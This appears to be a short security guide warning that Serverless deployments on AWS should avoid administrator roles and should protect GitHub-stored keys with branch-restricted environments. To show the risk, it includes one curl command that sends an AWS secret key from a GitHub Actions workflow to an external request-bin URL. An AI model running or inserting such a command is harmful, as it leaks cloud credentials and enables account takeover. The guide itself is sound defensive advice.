# Serverless Deployment Policy
Sadly, this is not clearly mentioned in the Servless documentation. 
But **never use the "Administration Role" on Production!** 
Because if you get access to these access keys, 
you can easily create a new user with web console access and have full access to your AWS account.

I would even say never use this "Administration Aole" for an AWS account if you only 
store the keys in GitHub Secrets without using the GitHub Environment with protected branches configuration.  

Because if you only store the keys in Github Secrets, 
any user who is allowed to commit to any branch can use Github Actions to send the keys to their own backend:

```
curl -d '{ "name": "${{ secrets.AWS_SECRET_KEY }}" }' \
  -H "Content-Type: application/json" \
  https://enci4g46iahum.x.pipedream.net/
```

So use the Environments on GitHub Repository level to allow the keys only on certain branches.
